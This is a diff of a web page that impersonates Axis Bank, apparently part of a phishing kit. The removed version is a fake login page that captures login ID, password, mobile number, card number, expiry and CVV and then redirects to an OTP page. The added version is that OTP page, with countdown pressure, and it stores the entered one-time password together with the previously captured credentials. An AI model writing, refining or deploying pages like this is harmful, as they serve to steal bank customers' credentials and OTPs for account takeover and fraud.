@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Axis Bank Net Banking</title>
+    <title>Axis Bank OTP Verification</title>
     <style>
         * {
             margin: 0;
@@ -19,14 +19,14 @@
             flex-direction: column;
         }
         
-        /* Page Load Animation - White background for dot reflection */
+        /* Page Load Animation */
         .page-loader {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: white; /* Solid white background for better dot reflection */
+            background: white;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -43,7 +43,7 @@
         .loader-dot {
             width: 15px;
             height: 15px;
-            background: #87103F; /* Maroon Red */
+            background: #87103F;
             border-radius: 50%;
             position: absolute;
             left: 0;
@@ -167,22 +167,6 @@
             }
         }
         
-        .loader-text {
-            color: #87103F;
-            font-size: 24px;
-            font-weight: bold;
-            position: absolute;
-            top: 60%;
-            text-align: center;
-            width: 100%;
-            opacity: 0;
-            animation: fadeInText 1s ease 0.5s forwards;
-        }
-        
-        @keyframes fadeInText {
-            to { opacity: 1; }
-        }
-        
         /* Main Container */
         .main-container {
             opacity: 0;
@@ -194,9 +178,9 @@
             to { opacity: 1; }
         }
         
-        /* Updated Header with left logo and custom heading */
+        /* Header - Updated with maroon red background and left logo */
         .bank-header {
-            background: white;
+            background: #87103F; /* Maroon Red */
             padding: 15px 40px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             position: relative;
@@ -216,11 +200,11 @@
             gap: 20px;
         }
         
-        /* Updated Logo */
         .bank-logo {
             height: 45px;
             width: auto;
             object-fit: contain;
+            filter: brightness(0) invert(1); /* Makes logo white on maroon background */
         }
         
         .bank-title {
@@ -231,11 +215,10 @@
         .bank-name {
             font-size: 28px;
             font-weight: bold;
-            color: #87103F;
+            color: white; /* White text on maroon background */
             letter-spacing: 1px;
         }
         
-        /* Your custom heading style */
         .header-info {
             display: flex;
             flex-direction: column;
@@ -249,172 +232,202 @@
         }
         
         .open-text {
-            color: #971647;
+            color: white; /* White text on maroon background */
             font-weight: bold;
             font-style: italic;
             font-size: 24px;
         }
         
         .banking-text {
-            color: #971647;
+            color: white; /* White text on maroon background */
             font-style: italic;
             font-size: 18px;
             letter-spacing: 1px;
         }
         
         .separator {
-            color: #ccc;
+            color: rgba(255, 255, 255, 0.7); /* Light separator on maroon */
             margin: 0 10px;
         }
         
         .login-using {
             font-size: 16px;
-            color: #666;
+            color: rgba(255, 255, 255, 0.9); /* Light text on maroon */
         }
         
         /* Main Content */
         .main-content {
-            display: flex;
             max-width: 1200px;
             margin: 30px auto;
             padding: 0 20px;
-            gap: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         
-        /* Login Box */
-        .login-container {
-            flex: 1;
+        /* OTP Container */
+        .otp-container {
+            width: 100%;
             max-width: 500px;
         }
         
-        .login-box {
+        .otp-box {
             background: white;
             border-radius: 12px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
             overflow: hidden;
         }
         
-        .login-header {
+        .otp-header {
             background: #87103F;
             color: white;
             padding: 25px;
             text-align: center;
         }
         
-        .login-title {
+        .otp-title {
             font-size: 24px;
             font-weight: bold;
             margin-bottom: 5px;
         }
         
-        .login-subtitle {
+        .otp-subtitle {
             opacity: 0.9;
             font-size: 16px;
         }
         
-        /* Toggle Switch - Updated with maroon red and white background */
-        .toggle-container {
-            display: flex;
-            background: white; /* White background */
-            border-radius: 50px;
-            padding: 5px;
-            margin: 25px auto 0;
-            width: 80%;
-            position: relative;
-            border: 2px solid #ddd; /* Added border for visibility */
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            margin-top: 15px;
+            border-radius: 3px;
+            overflow: hidden;
         }
         
-        .toggle-option {
-            flex: 1;
-            text-align: center;
-            padding: 12px;
-            border-radius: 50px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            z-index: 1;
-            position: relative;
-            color: #87103F; /* Maroon red text color */
+        .progress-fill {
+            height: 100%;
+            background: white;
+            width: 100%;
+            animation: progressAnimation 180s linear forwards;
         }
         
-        .toggle-slider {
-            position: absolute;
-            top: 5px;
-            left: 5px;
-            width: calc(50% - 5px);
-            height: calc(100% - 10px);
-            background: #87103F; /* Maroon red background */
-            border-radius: 50px;
-            transition: transform 0.3s ease;
-            box-shadow: 0 2px 8px rgba(135, 16, 63, 0.2);
+        @keyframes progressAnimation {
+            0% { width: 100%; }
+            100% { width: 0%; }
         }
         
-        .active-toggle {
-            color: white; /* White text for active option */
-        }
-        
-        /* Forms */
+        /* Form Container */
         .form-container {
             padding: 30px;
         }
         
-        .login-form {
-            display: block;
-        }
-        
-        .credit-form {
-            display: none;
-        }
-        
-        .form-group {
+        /* Info Message */
+        .info-message {
+            background: #f8f9fa;
+            border-left: 4px solid #87103F;
+            padding: 15px;
             margin-bottom: 25px;
+            border-radius: 0 8px 8px 0;
         }
         
-        .form-label {
+        .info-title {
+            font-weight: bold;
+            color: #87103F;
+            margin-bottom: 5px;
+            font-size: 16px;
+        }
+        
+        .info-text {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        /* OTP Input */
+        .otp-input-container {
+            margin-bottom: 30px;
+        }
+        
+        .otp-label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
             color: #333;
             font-weight: bold;
-            font-size: 14px;
+            font-size: 16px;
         }
         
-        .form-input {
-            width: 100%;
-            padding: 15px;
+        .otp-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+        
+        .otp-input {
+            width: 60px;
+            height: 70px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
             border: 2px solid #ddd;
             border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s ease;
             background: #f9f9f9;
+            transition: all 0.3s ease;
         }
         
-        .form-input:focus {
+        .otp-input:focus {
             border-color: #87103F;
             outline: none;
             background: white;
             box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
         }
         
-        .input-with-icon {
-            position: relative;
+        .otp-input.filled {
+            border-color: #87103F;
+            background: white;
         }
         
-        .input-icon {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
+        /* Timer */
+        .timer-container {
+            text-align: center;
+            margin-bottom: 25px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+        
+        .timer-title {
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .timer-display {
+            font-size: 32px;
+            font-weight: bold;
             color: #87103F;
+            margin-bottom: 10px;
         }
         
-        /* Login Button */
-        .login-btn-container {
-            position: relative;
-            overflow: hidden;
-            margin-top: 10px;
+        .timer-warning {
+            color: #e74c3c;
+            font-size: 14px;
+            font-weight: bold;
         }
         
-        .login-button {
+        /* Button Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .verify-button {
             width: 100%;
             background: #87103F;
             color: white;
@@ -430,18 +443,18 @@
             box-shadow: 0 5px 15px rgba(135, 16, 63, 0.3);
         }
         
-        .login-button:hover {
+        .verify-button:hover {
             background: #6a0c32;
             transform: translateY(-2px);
             box-shadow: 0 8px 20px rgba(135, 16, 63, 0.4);
         }
         
-        .login-button.loading {
+        .verify-button.loading {
             background: #6a0c32;
             cursor: not-allowed;
         }
         
-        .login-button.loading:after {
+        .verify-button.loading:after {
             content: '';
             position: absolute;
             top: 50%;
@@ -459,10 +472,37 @@
             to { transform: rotate(360deg); }
         }
         
+        .resend-button {
+            width: 100%;
+            background: #f0f2f5;
+            color: #87103F;
+            border: 2px solid #87103F;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .resend-button:hover {
+            background: #87103F;
+            color: white;
+        }
+        
+        .resend-button:disabled {
+            background: #e0e0e0;
+            color: #999;
+            border-color: #ccc;
+            cursor: not-allowed;
+        }
+        
         /* Links */
         .form-links {
             text-align: center;
             margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
         }
         
         .form-links a {
@@ -478,136 +518,8 @@
             text-decoration: underline;
         }
         
-        /* Info Sections */
-        .info-section {
-            flex: 1.5;
-        }
-        
-        .info-card {
-            background: #87103F;
-            color: white;
-            border-radius: 12px;
-            padding: 30px;
-            margin-bottom: 25px;
-            box-shadow: 0 8px 20px rgba(135, 16, 63, 0.2);
-            border-left: 5px solid #ffcc00;
-        }
-        
-        .info-title {
-            font-size: 22px;
-            font-weight: bold;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .info-icon {
-            font-size: 24px;
-        }
-        
-        .info-content {
-            line-height: 1.6;
-            margin-bottom: 20px;
-            font-size: 16px;
-            opacity: 0.95;
-        }
-        
-        .info-button {
-            background: white;
-            color: #87103F;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
-        
-        .info-button:hover {
-            background: #f0f0f0;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
-        }
-        
-        /* Footer - Background image added */
-        .main-footer {
-            background: url('https://ibb.co/mV0C8VGK') center/cover no-repeat;
-            color: white;
-            text-align: center;
-            padding: 30px 20px;
-            margin-top: 50px;
-            box-shadow: 0 -4px 12px rgba(135, 16, 63, 0.3);
-            /* Adding a dark overlay for better text readability */
-            position: relative;
-        }
-        
-        .main-footer::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5); /* Dark overlay */
-            z-index: 1;
-        }
-        
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 2;
-        }
-        
-        .footer-text {
-            font-size: 18px;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-        
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 25px;
-            margin-bottom: 20px;
-        }
-        
-        .footer-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            padding: 5px 10px;
-            border-radius: 4px;
-        }
-        
-        .footer-links a:hover {
-            background: rgba(255, 255, 255, 0.1);
-            text-decoration: underline;
-        }
-        
-        .copyright {
-            font-size: 14px;
-            opacity: 0.9;
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
         /* Responsive */
         @media (max-width: 992px) {
-            .main-content {
-                flex-direction: column;
-            }
-            
-            .login-container {
-                max-width: 100%;
-            }
-            
             .header-content {
                 flex-direction: column;
                 text-align: center;
@@ -645,22 +557,15 @@
                 font-size: 16px;
             }
             
-            .login-using {
-                font-size: 14px;
-            }
-            
             .main-content {
                 padding: 0 15px;
                 margin: 20px auto;
             }
             
-            .info-card {
-                padding: 20px;
-            }
-            
-            .footer-links {
-                flex-direction: column;
-                gap: 15px;
+            .otp-input {
+                width: 50px;
+                height: 60px;
+                font-size: 24px;
             }
         }
         
@@ -689,6 +594,16 @@
             .banking-text {
                 font-size: 14px;
             }
+            
+            .otp-input-group {
+                gap: 10px;
+            }
+            
+            .otp-input {
+                width: 45px;
+                height: 55px;
+                font-size: 20px;
+            }
         }
     </style>
 </head>
@@ -697,19 +612,18 @@
     <div class="page-loader" id="pageLoader">
         <div class="loader-container">
             <div class="loader-dot"></div>
-            <div class="loader-text">Loading Axis Bank Net Banking...</div>
         </div>
     </div>
     
     <!-- Main Container -->
     <div class="main-container">
-        <!-- Updated Header -->
+        <!-- Header - Same as index.html -->
         <header class="bank-header">
             <div class="header-content">
                 <div class="logo-section">
-                    <!-- YOUR HEADER LOGO -->
-                    <img src="https://ibb.co/MyKRr8sJ" 
-                         alt="Your Logo" 
+                    <!-- Axis Bank Logo -->
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Axis_Bank_logo.svg/2560px-Axis_Bank_logo.svg.png" 
+                         alt="Axis Bank Logo" 
                          class="bank-logo">
                     <div class="bank-title">
                         <div class="bank-name">AXIS BANK</div>
@@ -717,7 +631,7 @@
                 </div>
                 
                 <div class="header-info">
-                    <!-- Your custom heading -->
+                    <!-- Custom heading -->
                     <div class="header-text-container">
                         <span class="open-text">open</span>
                         <span class="separator">|</span>
@@ -730,148 +644,72 @@
         
         <!-- Main Content -->
         <div class="main-content">
-            <!-- Login Section -->
-            <div class="login-container">
-                <div class="login-box">
-                    <div class="login-header">
-                        <div class="login-title">Secure Login</div>
-                        <div class="login-subtitle">Access your account safely</div>
+            <div class="otp-container">
+                <div class="otp-box">
+                    <div class="otp-header">
+                        <div class="otp-title">OTP Verification</div>
+                        <div class="otp-subtitle">Enter the OTP sent to your registered mobile number</div>
                         
-                        <!-- Toggle Switch -->
-                        <div class="toggle-container">
-                            <div class="toggle-option active-toggle" id="toggleLogin">Login ID</div>
-                            <div class="toggle-option" id="toggleCredit">Credit Card</div>
-                            <div class="toggle-slider" id="toggleSlider"></div>
+                        <!-- Progress Bar for 3 minutes -->
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="progressFill"></div>
                         </div>
                     </div>
                     
                     <div class="form-container">
-                        <!-- Login ID Form -->
-                        <form class="login-form" id="loginForm">
-                            <div class="form-group">
-                                <label class="form-label" for="loginId">Login / Customer ID</label>
-                                <div class="input-with-icon">
-                                    <input type="text" class="form-input" id="loginId" name="loginId" placeholder="Enter your Login ID" required>
-                                    <div class="input-icon">👤</div>
-                                </div>
+                        <!-- Info Message -->
+                        <div class="info-message">
+                            <div class="info-title">🔒 Secure Verification</div>
+                            <div class="info-text">
+                                For your security, we've sent a One Time Password (OTP) to your registered mobile number ending with 
+                                <span id="mobileNumber">XXXX</span>. This OTP is valid for 3 minutes.
                             </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="password">Password</label>
-                                <div class="input-with-icon">
-                                    <input type="password" class="form-input" id="password" name="password" placeholder="Enter your password" required>
-                                    <div class="input-icon">🔒</div>
-                                </div>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="mobile">Mobile Number</label>
-                                <div class="input-with-icon">
-                                    <input type="tel" class="form-input" id="mobile" name="mobile" placeholder="Registered mobile number" required>
-                                    <div class="input-icon">📱</div>
-                                </div>
-                            </div>
-                            
-                            <div class="login-btn-container">
-                                <button type="submit" class="login-button" id="loginButton">
-                                    Login to Net Banking
-                                </button>
-                            </div>
-                        </form>
+                        </div>
                         
-                        <!-- Credit Card Form -->
-                        <form class="credit-form" id="creditForm">
-                            <div class="form-group">
-                                <label class="form-label" for="cardNumber">16 Digit Card Number</label>
-                                <div class="input-with-icon">
-                                    <input type="text" class="form-input" id="cardNumber" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
-                                    <div class="input-icon">💳</div>
+                        <!-- OTP Form -->
+                        <form id="otpForm">
+                            <div class="otp-input-container">
+                                <label class="otp-label" for="otp">Enter 6-digit OTP</label>
+                                <div class="otp-input-group" id="otpInputGroup">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="2" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="3" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="4" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="5" autocomplete="off">
+                                    <input type="text" class="otp-input" maxlength="1" data-index="6" autocomplete="off">
                                 </div>
+                                <input type="hidden" id="fullOtp" name="otp">
                             </div>
                             
-                            <div class="form-group">
-                                <label class="form-label" for="expiry">Expiry Date</label>
-                                <input type="text" class="form-input" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                            <!-- Timer -->
+                            <div class="timer-container">
+                                <div class="timer-title">Time Remaining</div>
+                                <div class="timer-display" id="timerDisplay">03:00</div>
+                                <div class="timer-warning" id="timerWarning"></div>
                             </div>
                             
-                            <div class="form-group">
-                                <label class="form-label" for="cvv">CVV</label>
-                                <input type="password" class="form-input" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="cardMobile">Mobile Number</label>
-                                <div class="input-with-icon">
-                                    <input type="tel" class="form-input" id="cardMobile" name="cardMobile" placeholder="Registered mobile number" required>
-                                    <div class="input-icon">📱</div>
-                                </div>
-                            </div>
-                            
-                            <div class="login-btn-container">
-                                <button type="submit" class="login-button" id="creditButton">
-                                    Login with Credit Card
+                            <!-- Buttons -->
+                            <div class="btn-container">
+                                <button type="submit" class="verify-button" id="verifyButton">
+                                    Verify OTP
+                                </button>
+                                
+                                <button type="button" class="resend-button" id="resendButton" disabled>
+                                    Resend OTP (180s)
                                 </button>
                             </div>
                         </form>
                         
                         <div class="form-links">
-                            <a href="#" id="forgotLink">Forgot Login ID / Password?</a>
-                            <a href="#">New User? Register Here</a>
+                            <a href="#" id="backLink">Back to Login</a>
+                            <a href="#" id="helpLink">Need Help?</a>
                         </div>
                     </div>
                 </div>
             </div>
-            
-            <!-- Info Section -->
-            <div class="info-section">
-                <div class="info-card">
-                    <div class="info-title">
-                        <span class="info-icon">🔒</span> Secure & Reliable
-                    </div>
-                    <div class="info-content">
-                        Bank with confidence. Know your digital safety measures.
-                    </div>
-                    <button class="info-button">KNOW MORE</button>
-                </div>
-                
-                <div class="info-card">
-                    <div class="info-title">
-                        <span class="info-icon">📞</span> Get in Touch
-                    </div>
-                    <div class="info-content">
-                        We have got your back when you are stuck.
-                    </div>
-                    <button class="info-button">KNOW MORE</button>
-                </div>
-                
-                <div class="info-card">
-                    <div class="info-title">
-                        <span class="info-icon">📱</span> Get Mobile App
-                    </div>
-                    <div class="info-content">
-                        Download our Axis Bank mobile app on your smartphone.
-                    </div>
-                    <button class="info-button">DOWNLOAD</button>
-                </div>
-            </div>
         </div>
         
-        <!-- Footer -->
-        <footer class="main-footer">
-            <div class="footer-content">
-                <div class="footer-text">Exclusive offers and products</div>
-                <div class="footer-links">
-                    <a href="#">Contactless enabled Credit Cards</a>
-                    <a href="#">Home loan upto Rs. 28 Lakhs</a>
-                    <a href="#">Experience seamless credit approval</a>
-                    <a href="#">Instant personal loans</a>
-                    <a href="#">Zero balance savings account</a>
-                </div>
-                <div class="copyright">
-                    © 2023 Axis Bank Ltd. All Rights Reserved. | <a href="#" style="color: white; text-decoration: underline;">Privacy Policy</a> | <a href="#" style="color: white; text-decoration: underline;">Terms of Service</a>
-                </div>
-            </div>
-        </footer>
+        <!-- Footer completely removed -->
     </div>
 
     <script>
@@ -885,270 +723,311 @@
             }, 3000);
         });
         
-        // DOM elements
-        const toggleLogin = document.getElementById('toggleLogin');
-        const toggleCredit = document.getElementById('toggleCredit');
-        const toggleSlider = document.getElementById('toggleSlider');
-        const loginForm = document.getElementById('loginForm');
-        const creditForm = document.getElementById('creditForm');
-        const forgotLink = document.getElementById('forgotLink');
-        const cardNumberInput = document.getElementById('cardNumber');
-        const expiryInput = document.getElementById('expiry');
-        const cvvInput = document.getElementById('cvv');
-        const loginButton = document.getElementById('loginButton');
-        const creditButton = document.getElementById('creditButton');
+        // DOM Elements
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const fullOtpInput = document.getElementById('fullOtp');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const timerWarning = document.getElementById('timerWarning');
+        const verifyButton = document.getElementById('verifyButton');
+        const resendButton = document.getElementById('resendButton');
+        const backLink = document.getElementById('backLink');
+        const helpLink = document.getElementById('helpLink');
+        const mobileNumberSpan = document.getElementById('mobileNumber');
+        const progressFill = document.getElementById('progressFill');
         
-        // Toggle Switch Functionality
-        toggleLogin.addEventListener('click', function() {
-            // Update toggle UI
-            toggleLogin.classList.add('active-toggle');
-            toggleCredit.classList.remove('active-toggle');
-            toggleSlider.style.transform = 'translateX(0)';
+        // Timer variables
+        let timeLeft = 180; // 3 minutes in seconds
+        let timerInterval;
+        let canResend = false;
+        
+        // Mobile number from previous submission (for demo)
+        let lastSubmission = getLastSubmission();
+        if (lastSubmission && lastSubmission.data && lastSubmission.data.mobile) {
+            let mobile = lastSubmission.data.mobile;
+            mobileNumberSpan.textContent = '******' + mobile.slice(-4);
+        }
+        
+        // OTP input handling
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/[^0-9]/gi, '');
+                e.target.value = value;
+                
+                if (value.length === 1) {
+                    e.target.classList.add('filled');
+                    
+                    // Move to next input if available
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                } else {
+                    e.target.classList.remove('filled');
+                }
+                
+                updateFullOtp();
+            });
             
-            // Show login form, hide credit form
-            loginForm.style.display = 'block';
-            creditForm.style.display = 'none';
+            input.addEventListener('keydown', function(e) {
+                // Handle backspace
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+                
+                // Handle arrow keys
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+                
+                if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
             
-            // Update forgot link
-            forgotLink.textContent = 'Forgot Login ID / Password?';
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                let pasteData = e.clipboardData.getData('text').replace(/[^0-9]/gi, '');
+                
+                if (pasteData.length === 6) {
+                    for (let i = 0; i < 6; i++) {
+                        if (i < otpInputs.length) {
+                            otpInputs[i].value = pasteData[i];
+                            otpInputs[i].classList.add('filled');
+                        }
+                    }
+                    updateFullOtp();
+                    otpInputs[5].focus();
+                }
+            });
         });
         
-        toggleCredit.addEventListener('click', function() {
-            // Update toggle UI
-            toggleCredit.classList.add('active-toggle');
-            toggleLogin.classList.remove('active-toggle');
-            toggleSlider.style.transform = 'translateX(100%)';
+        // Update full OTP value
+        function updateFullOtp() {
+            let otpValue = '';
+            otpInputs.forEach(input => {
+                otpValue += input.value;
+            });
+            fullOtpInput.value = otpValue;
+        }
+        
+        // Start timer
+        function startTimer() {
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                
+                // Update timer display
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+                timerDisplay.textContent = 
+                    minutes.toString().padStart(2, '0') + ':' + 
+                    seconds.toString().padStart(2, '0');
+                
+                // Update progress bar
+                let progressPercent = (timeLeft / 180) * 100;
+                progressFill.style.width = progressPercent + '%';
+                
+                // Update warning message
+                if (timeLeft === 60) {
+                    timerWarning.textContent = 'Hurry! Only 1 minute remaining';
+                } else if (timeLeft === 30) {
+                    timerWarning.textContent = 'Only 30 seconds remaining!';
+                } else if (timeLeft === 10) {
+                    timerWarning.textContent = 'Hurry up! OTP will expire soon!';
+                } else if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.textContent = '00:00';
+                    timerWarning.textContent = 'OTP has expired! Please resend.';
+                    progressFill.style.width = '0%';
+                    canResend = true;
+                    resendButton.disabled = false;
+                    resendButton.textContent = 'Resend OTP';
+                }
+            }, 1000);
+        }
+        
+        // Resend OTP
+        function resendOTP() {
+            if (!canResend) return;
             
-            // Show credit form, hide login form
-            loginForm.style.display = 'none';
-            creditForm.style.display = 'block';
+            // Reset timer
+            timeLeft = 180;
+            timerDisplay.textContent = '03:00';
+            timerWarning.textContent = '';
+            canResend = false;
+            resendButton.disabled = true;
+            resendButton.textContent = 'Resend OTP (180s)';
             
-            // Update forgot link
-            forgotLink.textContent = 'Forgot Credit Card Details?';
-        });
-        
-        // Format card number input (XXXX XXXX XXXX XXXX)
-        if (cardNumberInput) {
-            cardNumberInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-                let formattedValue = '';
-                
-                for (let i = 0; i < value.length && i < 16; i++) {
-                    if (i > 0 && i % 4 === 0) {
-                        formattedValue += ' ';
-                    }
-                    formattedValue += value[i];
-                }
-                
-                e.target.value = formattedValue;
+            // Reset OTP inputs
+            otpInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
             });
-        }
-        
-        // Format expiry date input (MM/YY)
-        if (expiryInput) {
-            expiryInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-                
-                if (value.length >= 2) {
-                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
-                } else {
-                    e.target.value = value;
-                }
-            });
-        }
-        
-        // Only allow numbers in CVV field
-        if (cvvInput) {
-            cvvInput.addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/[^0-9]/gi, '');
-            });
-        }
-        
-        // Form submission handlers
-        if (loginForm) {
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const loginId = document.getElementById('loginId').value;
-                const password = document.getElementById('password').value;
-                const mobile = document.getElementById('mobile').value;
-                
-                if (loginId && password && mobile) {
-                    // Show loading animation on button
-                    const submitBtn = document.getElementById('loginButton');
-                    const originalText = submitBtn.textContent;
-                    submitBtn.textContent = "Processing...";
-                    submitBtn.classList.add('loading');
-                    submitBtn.disabled = true;
-                    
-                    // Save data to localStorage
-                    saveSubmission('login', {
-                        loginId: loginId,
-                        password: password,
-                        mobile: mobile,
-                        time: new Date().toLocaleString()
-                    });
-                    
-                    // Simulate processing delay
-                    setTimeout(() => {
-                        // Remove loading state
-                        submitBtn.textContent = originalText;
-                        submitBtn.classList.remove('loading');
-                        submitBtn.disabled = false;
-                        
-                        // Redirect to OTP page
-                        window.location.href = 'axis_otp1.html';
-                        
-                        // Reset form
-                        loginForm.reset();
-                    }, 1500);
-                } else {
-                    // Quick error indication
-                    const submitBtn = document.getElementById('loginButton');
-                    submitBtn.style.background = '#ff4444';
-                    setTimeout(() => {
-                        submitBtn.style.background = '#87103F';
-                    }, 500);
-                }
-            });
-        }
-        
-        if (creditForm) {
-            creditForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const cardNumber = document.getElementById('cardNumber').value;
-                const expiry = document.getElementById('expiry').value;
-                const cvv = document.getElementById('cvv').value;
-                const cardMobile = document.getElementById('cardMobile').value;
-                
-                if (cardNumber && expiry && cvv && cardMobile) {
-                    const cleanCardNumber = cardNumber.replace(/\s+/g, '');
-                    
-                    if (cleanCardNumber.length !== 16) {
-                        // Quick error indication
-                        const submitBtn = document.getElementById('creditButton');
-                        submitBtn.style.background = '#ff4444';
-                        setTimeout(() => {
-                            submitBtn.style.background = '#87103F';
-                        }, 500);
-                        return;
-                    }
-                    
-                    if (cvv.length !== 3) {
-                        // Quick error indication
-                        const submitBtn = document.getElementById('creditButton');
-                        submitBtn.style.background = '#ff4444';
-                        setTimeout(() => {
-                            submitBtn.style.background = '#87103F';
-                        }, 500);
-                        return;
-                    }
-                    
-                    // Show loading animation on button
-                    const submitBtn = document.getElementById('creditButton');
-                    const originalText = submitBtn.textContent;
-                    submitBtn.textContent = "Verifying...";
-                    submitBtn.classList.add('loading');
-                    submitBtn.disabled = true;
-                    
-                    // Save data to localStorage
-                    saveSubmission('credit', {
-                        cardNumber: cardNumber,
-                        expiry: expiry,
-                        cvv: cvv,
-                        mobile: cardMobile,
-                        time: new Date().toLocaleString()
-                    });
-                    
-                    // Simulate processing delay
-                    setTimeout(() => {
-                        // Remove loading state
-                        submitBtn.textContent = originalText;
-                        submitBtn.classList.remove('loading');
-                        submitBtn.disabled = false;
-                        
-                        // Redirect to OTP page
-                        window.location.href = 'axis_otp1.html';
-                        
-                        // Reset form
-                        creditForm.reset();
-                    }, 1500);
-                } else {
-                    // Quick error indication
-                    const submitBtn = document.getElementById('creditButton');
-                    submitBtn.style.background = '#ff4444';
-                    setTimeout(() => {
-                        submitBtn.style.background = '#87103F';
-                    }, 500);
-                }
-            });
-        }
-        
-        // Save submission to localStorage
-        function saveSubmission(type, data) {
-            // Get existing submissions or create empty array
-            let submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            updateFullOtp();
             
-            // Add new submission at the beginning
-            submissions.unshift({
+            // Focus first input
+            otpInputs[0].focus();
+            
+            // Start timer again
+            clearInterval(timerInterval);
+            startTimer();
+            
+            // Simulate sending OTP
+            verifyButton.disabled = false;
+            verifyButton.textContent = 'Verify OTP';
+            
+            // Show success message
+            alert('New OTP has been sent to your registered mobile number.');
+        }
+        
+        // Get last submission from localStorage
+        function getLastSubmission() {
+            const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
+            return submissions.length > 0 ? submissions[0] : null;
+        }
+        
+        // Save OTP verification to localStorage
+        function saveOTPVerification(otp, status) {
+            // Get existing OTP verifications or create empty array
+            let otpVerifications = JSON.parse(localStorage.getItem('axisBankOTPVerifications') || '[]');
+            
+            // Get last submission
+            const lastSubmission = getLastSubmission();
+            
+            // Add new OTP verification
+            otpVerifications.unshift({
                 id: Date.now(),
-                type: type,
-                data: data,
+                otp: otp,
+                status: status,
                 timestamp: new Date().toISOString(),
-                isNew: true
+                submissionData: lastSubmission ? lastSubmission.data : null,
+                submissionType: lastSubmission ? lastSubmission.type : null
             });
             
             // Save back to localStorage
-            localStorage.setItem('axisBankSubmissions', JSON.stringify(submissions));
+            localStorage.setItem('axisBankOTPVerifications', JSON.stringify(otpVerifications));
             
